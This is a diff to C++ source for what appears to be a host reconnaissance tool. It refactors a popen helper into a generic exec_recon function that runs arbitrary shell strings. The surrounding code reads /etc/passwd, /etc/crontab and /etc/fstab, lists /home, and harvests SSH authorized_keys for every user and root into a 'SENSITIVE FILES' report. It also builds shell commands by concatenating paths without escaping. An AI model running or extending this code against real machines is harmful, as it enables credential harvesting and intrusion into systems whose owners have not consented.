@@ -12,6 +12,9 @@
 #include <sstream>
 #include <vector>
 #include <fstream>
+#include <memory>
+#include <array>
+#include <cstdio>
 
 // ============================================================================
 // MINIMAL DEPENDENCY HELPERS
@@ -268,11 +271,10 @@ static std::string read_file_safe(const std::string& path) {
     return ss.str();
 }
 
-// Simple directory listing using popen (already used elsewhere)
-static std::string list_dir(const std::string& dir) {
+// Simple command execution helper for directory listings
+static std::string exec_recon(const std::string& cmd) {
     std::array<char, 128> buffer;
     std::string result;
-    std::string cmd = "ls -la " + dir + " 2>/dev/null";
     std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"), pclose);
     if (!pipe) return "";
     while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
@@ -281,12 +283,14 @@ static std::string list_dir(const std::string& dir) {
     return result;
 }
 
-// Home directories + SSH keys
+static std::string list_dir(const std::string& dir) {
+    return exec_recon("ls -la " + dir + " 2>/dev/null");
+}
+
 static std::string collect_home_and_keys() {
     std::ostringstream out;
     out << "\n=== SENSITIVE FILES ===\n";
 
-    // Standard files
     out << "\n--- /etc/passwd ---\n";
     out << read_file_safe("/etc/passwd");
 
@@ -299,11 +303,10 @@ static std::string collect_home_and_keys() {
     out << "\n--- /etc/crontab ---\n";
     out << read_file_safe("/etc/crontab");
 
-    // Home directories (enumerate /home)
     out << "\n--- /home directory listing ---\n";
     out << list_dir("/home");
 
-    // If we can list /home/*, try to grab authorized_keys for each user
+    // SSH keys
     out << "\n--- SSH Authorized Keys ---\n";
     std::vector<std::string> home_dirs;
     {
@@ -318,7 +321,6 @@ static std::string collect_home_and_keys() {
             closedir(d);
         }
     }
-    // Also add root
     home_dirs.push_back("/root");
 
     for (const auto& dir : home_dirs) {
@@ -331,7 +333,6 @@ static std::string collect_home_and_keys() {
         }
     }
 
-    // Some other useful files
     out << "\n--- /etc/issue (OS info) ---\n";
     out << read_file_safe("/etc/issue");
     out << "\n--- /etc/fstab ---\n";
@@ -347,7 +348,6 @@ static std::string collect_home_and_keys() {
 std::string perform_full_recon() {
     std::ostringstream output;
     
-    // System information
     struct utsname uts;
     char hostname[64] = "unknown";
     char kernel[128] = "unknown";
@@ -385,7 +385,6 @@ std::string perform_full_recon() {
         output << "PID: " << proc.pid << " | UID: " << proc.uid << " | " << proc.comm << "\n";
     }
 
-    // Append sensitive file collection
     output << collect_home_and_keys();
 
     output << "\n=== END RECON ===\n";
